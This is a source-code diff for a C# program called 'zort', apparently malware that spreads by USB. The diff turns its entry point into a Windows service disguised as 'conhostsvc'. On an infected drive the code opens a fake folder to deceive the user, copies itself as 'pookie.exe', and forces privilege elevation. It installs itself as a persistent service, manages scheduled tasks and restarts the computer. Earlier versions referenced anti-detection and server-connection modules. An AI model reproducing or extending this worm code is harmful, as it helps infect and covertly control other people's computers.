@@ -1,139 +1,188 @@
 ﻿using System;
-using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
-using System.Threading;
+using System.Linq;
+using System.Reflection;
+using System.ServiceProcess;
 
 namespace zort
 {
-    class Program
+    class Program : ServiceBase
     {
-        readonly List<IPayloadModule> modules = new List<IPayloadModule>
-                {
-                    new AntiDetection(),
-                    new ServerCon(),
-                    new RemovableInfector(),
-                    //new ElevationHelper(),
-                    //new ServiceManager(),
-                };
-
-        static void Main(string[] args)
+        public const string SERVICE_NAME = "conhostsvc";
+        public const string TASK_NAME = "PookieBearUwU";
+        public Program()
         {
-            var process = Process.GetCurrentProcess();
-            process.PriorityClass = ProcessPriorityClass.AboveNormal;
+            ServiceName = SERVICE_NAME;
+        }
 
-            try
+        public enum ExecutionState
+        {
+            Usb,
+            Pookie,
+            Service,
+            Unknown
+        }
+
+        public static bool IsTaskSet()
+        {
+            using (var taskService = new Microsoft.Win32.TaskScheduler.TaskService())
             {
-                string AppdataRoaming = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
-                string AppdataRoamingPookie = Path.Combine(AppdataRoaming, "Pookie");
-                string exePath = Path.Combine(AppdataRoamingPookie, "pookie.exe");
-                string selfPath = System.Reflection.Assembly.GetExecutingAssembly().Location;
-                bool isPookie = Path.GetFullPath(selfPath).Equals(Path.GetFullPath(exePath), StringComparison.OrdinalIgnoreCase);
-
-                RemovableInfector.CheckIfRunningFromRemovableDrive();
-                if (!RemovableInfector.IsSystemInfected())
-                {
-                    PersistenceHelper.CopyToTempAndScheduleRun();
-                }
-                else
-                {
-                    //Check if the exe in Public Pictures is running
-                    Console.WriteLine($"Self path: {selfPath}");
-                    Console.WriteLine($"Exe path: {exePath}");
-                    if (isPookie)
-                    {
-                        Console.WriteLine("Infected file (me) is running.");
-                    }
-                    else
-                    {
-                        bool running = Process.GetProcessesByName("pookie").Length > 0;
-                        if (File.Exists(exePath))
-                        {
-                            Console.WriteLine("Infected files found in Public Pictures.");
-                            if (!running)
-                            {
-                                Console.WriteLine("Infected files found in Public Pictures not running. Running the infected file.");
-                                var p = Process.Start(exePath);
-                                //check if it exits in 5 seconds
-                                p.WaitForExit(5000);
-                                if (p.HasExited)
-                                {
-                                    //exe is broken. recopy it and continue running from here.
-                                    PersistenceHelper.CopyToTempAndScheduleRun(true);
-                                    Console.WriteLine("Infected file is broken. Recopying it to Public Pictures.");
-                                    goto payload;
-                                }
-                            }
-                            Environment.Exit(0);
-                        }
-                        else
-                        {
-                            Console.WriteLine("No infected files found in Public Pictures.");
-                            PersistenceHelper.CopyToTempAndScheduleRun(true); //just copy and let the already existing wmi action to handle it.
-                        }
-                    }
-
-                payload:
-                    var program = new Program();
-                    program.InitModules();
-                    //Console.WriteLine("Press any key to exit...");
-                    if(isPookie)
-                    {
-                        Thread.Sleep(Timeout.Infinite);
-                    } else
-                    {
-                        //check if pookie is running every 5 seconds
-                        while (true)
-                        {
-                            Thread.Sleep(5000);
-                            bool running = Process.GetProcessesByName("pookie").Length > 0;
-                            if (!running)
-                            {
-                                Console.WriteLine("Infected file is not running. Exiting.");
-                                Environment.Exit(0);
-                            }
-                            else
-                            {
-                                Console.WriteLine("Infected file is running.");
-                            }
-                        }
-                    }
-                }
-            }
-            catch (Exception ex)
-            {
-                File.AppendAllText("C:\\service-error.log", $"[{DateTime.Now}] ERROR: {ex}\n");
-                throw;
+                var task = taskService.FindTask(TASK_NAME);
+                return task != null;
             }
         }
 
-        private void InitModules()
+        static void Main(string[] args)
         {
-            bool isAdmin = false;
-
-            modules.ForEach(m =>
+            Program program = new Program();
+            if (Environment.UserInteractive)
             {
-                switch (m.ElevationType)
+                // Run as console application
+                program.OnStart(args);
+                Console.WriteLine("Press any key to stop...");
+                Console.ReadKey();
+                program.OnStop();
+            }
+            else
+            {
+                // Run as Windows Service
+                Run(program);
+            }
+        }
+
+        private static ExecutionState GetExecutionState()
+        {
+            if (RemovableInfector.IsRunningFromInfectedUsb()) return ExecutionState.Usb;
+            if (PookieHelper.AmIPookie()) return ExecutionState.Pookie;
+            if (ServiceHelper.AmIService()) return ExecutionState.Service;
+            return ExecutionState.Unknown;
+        }
+
+        private void UsbRoutine()
+        {
+            RemovableInfector.OpenFakeFolderIfRunningFromInfectedUsb();
+            if (PookieHelper.PookieExists())
+            {
+                if (!PookieHelper.IsPookieRunning())
                 {
-                    case ElevationType.Elevated:
-                        if (!isAdmin)
-                        {
-                            Console.WriteLine($"Skipping module {m.ModuleName}, it requires admin privileges.");
-                            return;
-                        }
-                        break;
-                    case ElevationType.NonElevated:
-                        if (isAdmin)
-                        {
-                            Console.WriteLine($"Skipping module {m.ModuleName}, it does not need to work unelevated.");
-                            return;
-                        }
-                        break;
+                    string pookiePath = PookieHelper.GetPookiePath();
+                    Process.Start(pookiePath);
+                }
+                Exit();
+            }
+            else
+            {
+                PookieHelper.CreatePookie();
+                string pookiePath = PookieHelper.GetPookiePath();
+                ElevationHelper.ForceElevate(pookiePath);
+                Exit();
+            }
+        }
+
+        protected override void OnStart(string[] args)
+        {
+            var executionState = GetExecutionState();
+            Console.WriteLine($"Execution state: {executionState}");
+            switch (executionState)
+            {
+                case ExecutionState.Usb:
+                    UsbRoutine();
+                    break;
+                case ExecutionState.Pookie:
+                    PookieRoutine();
+                    break;
+                case ExecutionState.Service:
+                    Console.WriteLine("YIPPIE!!");
+                    break;
+            }
+        }
+
+        private void PookieRoutine()
+        {
+            if (PookieHelper.PookieMutex.Exists()) //also creates the mutex
+            {
+                Console.WriteLine("Pookie mutex exists, exiting.");
+                Exit();
+            }
+
+            bool isAdmin = ElevationHelper.IsElevated();
+            if (isAdmin)
+            {
+                if (ServiceHelper.IsServiceInstalled())
+                {
+                    Console.WriteLine("Service is installed.");
+                    if (!ServiceHelper.IsServiceRunning())
+                    {
+                        Console.WriteLine("Service is not running. Starting service...");
+                        ServiceHelper.StartService();
+                    }
+                    else
+                    {
+                        Console.WriteLine("Service is already running.");
+                    }
+                    PookieHelper.PookieMutex.Release();
+                    Console.WriteLine("Pookie mutex released. Exiting...");
+                    Exit();
+                    return;
                 }
 
-                Console.WriteLine($"Starting module {m.ModuleName}");
-                m.Start();
-            });
+                Console.WriteLine("Service is not installed. Creating clone...");
+                string clonePath = ServiceHelper.CreateItITClone();
+                Console.WriteLine($"Clone created at path: {clonePath}. Installing service...");
+                ServiceHelper.InstallService(clonePath);
+                Console.WriteLine("Service installed successfully.");
+                PookieHelper.PookieMutex.Release();
+                Console.WriteLine("Pookie mutex released.");
+
+                if (PookieHelper.Tasks.StartAtLogon.Exists())
+                {
+                    Console.WriteLine("StartAtLogon task exists. Removing...");
+                    PookieHelper.Tasks.StartAtLogon.Remove();
+                }
+
+                if (PookieHelper.Tasks.DeletePookieAtNextLogon.Exists())
+                {
+                    Console.WriteLine("DeletePookieAtNextLogon task exists. Removing...");
+                    PookieHelper.Tasks.DeletePookieAtNextLogon.Remove();
+                }
+
+                Console.WriteLine("Creating DeletePookieAtNextLogon task...");
+                PookieHelper.Tasks.DeletePookieAtNextLogon.Create();
+                Console.WriteLine("Task created successfully. Restarting computer...");
+                Util.RestartComputer();
+                Console.WriteLine("Restart initiated. Exiting...");
+                Exit();
+                return;
+            }
+            else
+            {
+                string pookiePath = PookieHelper.GetPookiePath(); //also my path!!
+                ElevationHelper.ForceElevate(pookiePath);
+                PookieHelper.PookieMutex.Release();
+                Exit();
+                return;
+            }
+        }
+
+        private void Exit()
+        {
+            Environment.Exit(0);
+        }
+
+        protected override void OnStop()
+        {
+
+        }
+
+        protected override void OnPause()
+        {
+
+        }
+
+        protected override void OnContinue()
+        {
+
         }
     }
 }
